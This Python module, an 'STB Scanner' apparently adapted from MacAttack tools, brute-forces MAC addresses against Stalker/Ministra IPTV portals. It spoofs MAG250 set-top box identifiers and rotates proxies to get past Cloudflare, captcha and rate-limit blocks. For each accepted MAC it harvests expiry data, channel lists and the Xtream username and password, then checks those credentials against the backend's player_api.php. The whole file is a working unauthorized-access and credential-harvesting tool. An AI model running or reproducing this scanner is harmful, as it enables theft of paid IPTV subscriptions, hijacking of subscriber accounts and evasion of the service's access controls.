"""
STB Scanner API - Sync Version
Optimized for MAC scanning with 3-Phase logic
Based on MacAttackWeb-NEW stb.py

Features:
- 3-Phase Scan: Quick Scan → Validation → Full Scan
- Intelligent Error Classification (ProxyDeadError, ProxySlowError, ProxyBlockedError)
- Connection Pooling (20 pools, 100 connections)
- Compatible Mode (MacAttack.pyw behavior)
- 2-3 Requests per MAC (vs 5 in fallback)
"""
import requests
from urllib.parse import urlparse, quote
from functools import lru_cache
import hashlib
import json
import time
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

logger = logging.getLogger("MacReplayXC.stb_scanner")

# ============== OPTIMIZED SESSION WITH CONNECTION POOLING ==============
_session = None

def get_optimized_session():
    """Get or create optimized session with connection pooling."""
    global _session
    if _session is None:
        _session = requests.Session()
        
        # Configure adapter with connection pooling
        adapter = HTTPAdapter(
            pool_connections=20,      # Number of connection pools
            pool_maxsize=100,         # Max connections per pool
            max_retries=Retry(total=0)  # No automatic retries (we handle manually)
        )
        
        _session.mount('http://', adapter)
        _session.mount('https://', adapter)
        
        # Set default headers
        _session.headers.update({
            'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        })
    
    return _session


# ============== ERROR TYPES ==============

class ProxyError(Exception):
    """Base proxy error - retry MAC with different proxy"""
    pass

class ProxyDeadError(ProxyError):
    """Proxy unreachable (connection refused, DNS fail)"""
    pass

class ProxySlowError(ProxyError):
    """Proxy timeout"""
    pass

class ProxyBlockedError(ProxyError):
    """Proxy blocked by portal (403, rate limit)"""
    pass


# ============== HELPERS ==============

def parse_proxy(proxy_str):
    """Parse proxy string to requests format."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("socks5://", "socks4://", "http://")):
        return {"http": proxy_str, "https": proxy_str}
    return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}


def generate_device_ids(mac):
    """Generate device IDs from MAC."""
    sn = hashlib.md5(mac.encode()).hexdigest().upper()[:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    return sn, device_id, device_id2, hw_version_2


def get_headers(token=None, token_random=None):
    """Get request headers."""
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "close",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if token_random is not None:
        headers["X-Random"] = str(token_random)
    return headers


def get_cookies(mac):
    """Get request cookies."""
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    return {
        "adid": hw_version_2, "debug": "1", "device_id2": device_id2,
        "device_id": device_id, "hw_version": "1.7-BD-00", "mac": mac,
        "sn": sn, "stb_lang": "en", "timezone": "America/Los_Angeles",
    }


@lru_cache(maxsize=100)
def get_portal_info(url):
    """Extract base URL and portal type from URL.
    
    Supports 45+ portal types from FoxyMACSCAN.
    """
    url = url.rstrip('/')
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    base = f"{scheme}://{host}:{port}"
    path = parsed.path.strip('/')
    
    # Extended portal type detection (45+ types)
    PORTAL_PATTERNS = [
        # Standard patterns
        ("stalker_portal/server/load.php", "stalker_portal/server/load.php"),
        ("server/load.php", "server/load.php"),
        ("stalker_portal/portal.php", "stalker_portal/portal.php"),
        ("stalker_portal/load.php", "stalker_portal/load.php"),
        ("server/move.php", "server/move.php"),
        ("stalker_u.php", "stalker_u.php"),
        
        # Ghandi Portal
        ("ghandi_portal/server/load.php", "ghandi_portal/server/load.php"),
        
        # MAG Load
        ("magLoad.php", "magLoad.php"),
        
        # Ministra variants
        ("ministra/portal.php", "ministra/portal.php"),
        ("portalstb/portal.php", "portalstb/portal.php"),
        ("client/portal.php", "client/portal.php"),
        ("stb/portal/portal.php", "stb/portal/portal.php"),
        
        # BoSS variants
        ("BoSSxxxx/portal.php", "BoSSxxxx/portal.php"),
        
        # C-path variants (nested)
        ("c/c/c/stalker_portal/server/load.php", "c/c/c/stalker_portal/server/load.php"),
        ("c/c/c/server/load.php", "c/c/c/server/load.php"),
        ("c/c/c/portal.php", "c/c/c/portal.php"),
        ("c/c/c/stalker_u.php", "c/c/c/stalker_u.php"),
        ("c/c/stalker_portal/server/load.php", "c/c/stalker_portal/server/load.php"),
        ("c/c/server/load.php", "c/c/server/load.php"),
        ("c/c/portal.php", "c/c/portal.php"),
        ("c/c/stalker_u.php", "c/c/stalker_u.php"),
        ("c/c/BoSSxxxx/portal.php", "c/c/BoSSxxxx/portal.php"),
        ("c/stalker_portal/server/load.php", "c/stalker_portal/server/load.php"),
        ("c/server/load.php", "c/server/load.php"),
        ("c/portal.php", "c/portal.php"),
        ("c/stalker_u.php", "c/stalker_u.php"),
        ("c/BoSSxxxx/portal.php", "c/BoSSxxxx/portal.php"),
        
        # XX-path variants (nested)
        ("xx/c/c/c/stalker_portal/server/load.php", "xx/c/c/c/stalker_portal/server/load.php"),
        ("xx/c/c/c/server/load.php", "xx/c/c/c/server/load.php"),
        ("xx/c/c/c/portal.php", "xx/c/c/c/portal.php"),
        ("xx/c/c/c/stalker_u.php", "xx/c/c/c/stalker_u.php"),
        ("xx/c/c/stalker_portal/server/load.php", "xx/c/c/stalker_portal/server/load.php"),
        ("xx/c/c/server/load.php", "xx/c/c/server/load.php"),
        ("xx/c/c/portal.php", "xx/c/c/portal.php"),
        ("xx/c/c/stalker_u.php", "xx/c/c/stalker_u.php"),
        ("xx/c/c/BoSSxxxx/portal.php", "xx/c/c/BoSSxxxx/portal.php"),
        ("xx/c/stalker_portal/server/load.php", "xx/c/stalker_portal/server/load.php"),
        ("xx/c/server/load.php", "xx/c/server/load.php"),
        ("xx/c/portal.php", "xx/c/portal.php"),
        ("xx/c/stalker_u.php", "xx/c/stalker_u.php"),
        ("xx/c/BoSSxxxx/portal.php", "xx/c/BoSSxxxx/portal.php"),
        ("xx/stalker_portal/server/load.php", "xx/stalker_portal/server/load.php"),
        ("xx/server/load.php", "xx/server/load.php"),
        ("xx/portal.php", "xx/portal.php"),
        ("xx/stalker_u.php", "xx/stalker_u.php"),
        ("xx/BoSSxxxx/portal.php", "xx/BoSSxxxx/portal.php"),
        
        # Default portal.php (must be last)
        ("portal.php", "portal.php"),
    ]
    
    # Find matching pattern
    for pattern, endpoint in PORTAL_PATTERNS:
        if path.endswith(pattern):
            return base, endpoint
    
    # Fallback: check if path contains known patterns
    if "stalker_portal" in path:
        return base, "stalker_portal/server/load.php"
    
    # Default to portal.php
    return base, "portal.php"


def do_request(url, cookies, headers, proxies, timeout, connect_timeout=2):
    """
    Make HTTP request with optimized session and proper error handling.
    
    Returns: Response object
    Raises: 
        - ProxyDeadError: Connection failed, proxy offline
        - ProxySlowError: Timeout, gateway errors
        - ProxyBlockedError: Proxy blocked by portal (Cloudflare, rate limit)
    """
    session = get_optimized_session()
    
    try:
        resp = session.get(url, cookies=cookies, headers=headers, 
                          proxies=proxies, timeout=(connect_timeout, timeout))
        
        # Check for Cloudflare / HTML error pages (proxy blocked)
        content_type = resp.headers.get("Content-Type", "").lower()
        if "text/html" in content_type:
            if "cloudflare" in resp.text.lower() or "captcha" in resp.text.lower():
                raise ProxyBlockedError("Cloudflare/Captcha detected")
            if resp.status_code >= 500:
                raise ProxyBlockedError(f"HTTP {resp.status_code} - Server error")
        
        # HTTP 403 analysis
        if resp.status_code == 403:
            try:
                data = resp.json()
                if isinstance(data, dict) and ("js" in data or "error" in data):
                    return resp
            except:
                pass
            if "text/html" in content_type:
                raise ProxyBlockedError("403 Forbidden - HTML response (proxy blocked)")
            return resp
        
        # Gateway errors
        if resp.status_code in (502, 503, 504):
            raise ProxySlowError(f"Gateway error {resp.status_code}")
        
        # Rate limit
        if resp.status_code == 429:
            try:
                data = resp.json()
                if isinstance(data, dict):
                    return resp
            except:
                pass
            raise ProxyBlockedError("Rate limit exceeded")
        
        return resp
        
    except requests.exceptions.ConnectTimeout:
        raise ProxyDeadError("Connect timeout")
    except requests.exceptions.ReadTimeout:
        raise ProxySlowError("Read timeout")
    except requests.exceptions.ProxyError as e:
        raise ProxyDeadError(f"Proxy error: {e}")
    except requests.exceptions.ConnectionError as e:
        err = str(e).lower()
        if any(x in err for x in ["refused", "unreachable", "no route", "dns"]):
            raise ProxyDeadError(str(e))
        raise ProxySlowError(str(e))
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except Exception as e:
        raise ProxyError(str(e))


# ============== MAIN SCAN FUNCTION ==============

def test_mac(url, mac, proxy=None, timeout=10, connect_timeout=5, require_channels=True, min_channels=1, compatible_mode=False):
    """
    Test MAC address - Optimized 3-Phase approach
    
    Phase 1: Quick Scan (Handshake) - Token check
    Phase 2: Quick Validation - Channel count check
    Phase 3: Full Scan - Get all details
    
    Returns: (is_valid, result_dict)
    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError
    """
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    headers = get_headers()
    proxies = parse_proxy(proxy)
    
    # ========== PHASE 1: QUICK SCAN (Handshake) ==========
    handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    
    resp = do_request(handshake_url, cookies, headers, proxies, timeout, connect_timeout)
    
    if resp.status_code not in [200, 204, 404, 512]:
        raise ProxyBlockedError(f"HTTP {resp.status_code} - Unexpected status code")
    
    if "REMOTE_ADDR" in resp.text or "Backend not available" in resp.text:
        return False, {"mac": mac, "error": "Portal error"}
    
    # Parse token
    token = None
    token_random = None
    try:
        data = resp.json()
        token = data.get("js", {}).get("token")
        token_random = data.get("js", {}).get("random")
    except (json.JSONDecodeError, ValueError) as e:
        raise ProxySlowError(f"Invalid JSON response: {e}")
    except Exception as e:
        raise ProxySlowError(f"Failed to parse response: {e}")
    
    # Token check with mode selection
    if not token:
        if compatible_mode:
            return False, {"mac": mac, "error": "No token - MAC invalid (compatible mode)"}
        else:
            # Intelligent mode: Analyze response
            if resp.text.strip() == "" or len(resp.text) < 10:
                raise ProxySlowError("No token - Empty/short response (possible proxy issue)")
            elif resp.status_code == 404:
                try:
                    if isinstance(data, dict) and ("js" in data or "error" in data):
                        return False, {"mac": mac, "error": "No token - MAC invalid (404)"}
                    else:
                        raise ProxyBlockedError("No token - Unstructured 404 (possible proxy block)")
                except:
                    raise ProxyBlockedError("No token - 404 response analysis failed")
            else:
                try:
                    if isinstance(data, dict) and ("js" in data or "error" in data):
                        return False, {"mac": mac, "error": "No token - MAC invalid (structured response)"}
                    else:
                        raise ProxySlowError("No token - Unstructured response (possible proxy issue)")
                except:
                    return False, {"mac": mac, "error": "No token - MAC invalid (analysis failed)"}
    
    # ========== TOKEN RECEIVED = MAC IS VALID ==========
    # ========== PHASE 2: FULL SCAN (Details) ==========
    
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    headers = get_headers(token, token_random)
    
    result = {
        "mac": mac,
        "expiry": "Unknown",
        "channels": 0,
        "genres": [],
        "vod_categories": [],
        "series_categories": [],
        "backend_url": None,
        "username": None,
        "password": None,
        "max_connections": None,
        "created_at": None,
        "client_ip": None,
    }
    
    # Calculate sig
    if token_random:
        sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
    else:
        sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
    
    metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
                          "uid": device_id, "random": token_random or 0})
    
    # Step 1: Activate profile
    try:
        profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}&api_sig=262&prehash=0"
        resp = do_request(profile_url, cookies, headers, proxies, timeout, connect_timeout)
        
        if resp.status_code == 401:
            return False, {"mac": mac, "error": "401 during profile"}
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_profile")
        
        if "js" in data:
            result["client_ip"] = data["js"].get("ip")
            if data["js"].get("expire_billing_date"):
                result["expiry"] = data["js"]["expire_billing_date"]
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 2: get_main_info for expiry
    try:
        main_url = f"{base_url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        resp = do_request(main_url, cookies, headers, proxies, timeout, connect_timeout)
        
        if resp.status_code == 401:
            return False, {"mac": mac, "error": "401 during main_info"}
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_main_info")
        
        js = data.get("js", {})
        expiry = js.get("phone", "")
        if expiry:
            try:
                result["expiry"] = time.strftime("%B %d, %Y", time.gmtime(int(expiry)))
            except:
                result["expiry"] = str(expiry)
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 3: Channels (QUICK CHECK FIRST)
    channels_count = 0
    try:
        ch_url = f"{base_url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
        resp = do_request(ch_url, cookies, headers, proxies, timeout, connect_timeout)
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_channels")
        
        if "js" in data and "data" in data["js"]:
            channels_count = len(data["js"]["data"])
            result["channels"] = channels_count
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # ========== QUICK VALIDATION ==========
    if require_channels and channels_count < min_channels:
        return False, {"mac": mac, "error": f"Only {channels_count} channels (minimum: {min_channels})"}
    
    # ========== CONTINUE WITH FULL SCAN ==========
    
    # Step 4: Genres
    try:
        g_url = f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        resp = do_request(g_url, cookies, headers, proxies, timeout, connect_timeout)
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_genres")
        
        if "js" in data:
            result["genres"] = [g.get("title", "") for g in data["js"] if g.get("id") != "*"]
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 5: VOD categories (non-critical)
    try:
        v_url = f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        resp = requests.get(v_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        if "js" in data:
            result["vod_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
    except:
        pass
    
    # Step 6: Series categories (non-critical)
    try:
        s_url = f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
        resp = requests.get(s_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        if "js" in data:
            result["series_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
    except:
        pass
    
    # Step 7: Backend/Credentials (non-critical)
    try:
        link_url = f"{base_url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
        resp = requests.get(link_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        cmd = data.get("js", {}).get("cmd", "")
        if cmd:
            cmd = cmd.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
            parsed = urlparse(cmd)
            if parsed.hostname:
                result["backend_url"] = f"{parsed.scheme}://{parsed.hostname}"
                if parsed.port:
                    result["backend_url"] += f":{parsed.port}"
                parts = parsed.path.strip("/").split("/")
                if len(parts) >= 2:
                    result["username"], result["password"] = parts[0], parts[1]
                    # Xtream API
                    try:
                        x_url = f"{result['backend_url']}/player_api.php?username={result['username']}&password={result['password']}"
                        xr = requests.get(x_url, proxies=proxies, timeout=(3, 5))
                        xd = xr.json().get("user_info", {})
                        if "max_connections" in xd:
                            result["max_connections"] = int(xd["max_connections"])
                        if "created_at" in xd:
                            result["created_at"] = time.strftime("%B %d, %Y", time.gmtime(int(xd["created_at"])))
                    except:
                        pass
    except:
        pass
    
    return True, result
